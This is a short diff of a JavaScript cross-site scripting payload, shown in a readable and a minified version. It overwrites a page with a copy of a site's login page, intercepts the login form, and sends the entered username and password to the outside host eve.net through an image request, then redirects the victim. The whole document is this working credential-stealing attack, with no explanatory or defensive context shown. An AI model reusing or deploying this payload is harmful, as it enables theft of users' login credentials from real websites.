@@ -1,11 +1,1 @@
-(async() =>
-document.write(await fetch('/login.php').then(r => r.text()) + `
-  <script>
-  setTimeout(() => $('form[action*=login]').submit(e => {
-    e.preventDefault()
-    c = e.currentTarget
-    new Image().src = '//eve.net/' + btoa(c[0].value) + ':' + btoa(c[1].value)
-    setTimeout(() => window.location = '/do-question.php?aaid=10972720', 1000)
-  }), 4000)
-  </script>
-`))()
+(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="//eve.net/"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid=10972720",1e3)}),4e3);</script>`))()
